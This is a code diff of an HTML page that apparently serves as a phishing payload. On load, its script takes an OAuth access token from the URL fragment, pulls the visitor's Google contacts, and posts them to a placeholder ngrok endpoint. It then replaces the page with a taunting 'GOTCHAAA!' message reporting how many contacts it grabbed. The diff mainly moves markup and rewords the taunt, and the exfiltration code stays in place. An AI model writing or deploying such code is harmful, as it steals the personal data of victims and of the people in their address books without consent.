@@ -2,6 +2,9 @@
 <html>
 <head>
     <title>📁 Extracting Contacts...</title>
+</head>
+<body>
+    <h2>⏳ Please wait...</h2>
     <script>
         window.onload = async function () {
             const hash = new URLSearchParams(window.location.hash.substring(1));
@@ -19,22 +22,19 @@
             const data = await res.json();
 
             // Send to your backend
-            await fetch('https://your-ngrok-or-flask-url/log', {
+            await fetch('https://YOUR_NGROK_URL_HERE/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ contacts: data.connections || [] })
             });
 
-            // Gotcha moment
+            // Dramatic moment
             document.body.innerHTML = `
-                <h1 style="color:red;">😂 GOTCHAAAA! Kane strikes again!</h1>
-                <p>We just grabbed <strong>${(data.connections || []).length}</strong> contacts straight from your Google.</p>
-                <small>This was a security test. You passed by trusting the wrong person 😉</small>
+                <h1 style="color:red;">GOTCHAAA!</h1>
+                <p>We just grabbed <strong>${(data.connections || []).length}</strong> contacts.</p>
+                <small>This is it</small>
             `;
         }
     </script>
-</head>
-<body>
-    <h2>⏳ Please wait...</h2>
 </body>
 </html>
